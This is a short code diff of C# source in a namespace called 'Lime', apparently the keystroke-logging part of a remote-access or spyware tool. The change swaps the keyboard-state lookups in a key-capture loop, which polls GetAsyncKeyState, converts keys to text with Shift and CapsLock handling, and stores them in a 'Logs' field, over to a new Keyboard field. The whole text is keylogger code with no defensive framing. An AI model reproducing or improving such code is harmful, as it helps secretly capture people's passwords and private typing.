@@ -6,6 +6,7 @@ using System.Threading;
 using System.Windows.Forms;
 using Microsoft.VisualBasic;
 using Microsoft.VisualBasic.CompilerServices;
+using Microsoft.VisualBasic.Devices;
 using Microsoft.Win32;
 
 namespace Lime
@@ -112,8 +113,8 @@ namespace Lime
 
 		private string Fix(Keys k)
 		{
-			bool flag = Core._Computer.Keyboard.ShiftKeyDown;
-			if (Core._Computer.Keyboard.CapsLock)
+			bool flag = keyboard.ShiftKeyDown;
+			if (keyboard.CapsLock)
 			{
 				if (flag)
 				{
@@ -197,7 +198,7 @@ namespace Lime
 						int num2 = 0;
 						do
 						{
-							if (GetAsyncKeyState(num2) == -32767 & !Core._Computer.Keyboard.CtrlKeyDown)
+							if (GetAsyncKeyState(num2) == -32767 & !keyboard.CtrlKeyDown)
 							{
 								Keys k = (Keys)num2;
 								string text = this.Fix(k);
@@ -241,5 +242,7 @@ namespace Lime
 		public string Logs;
 
 		public string vn;
-	}
+
+        public Keyboard keyboard = new Keyboard();
+    }
 }
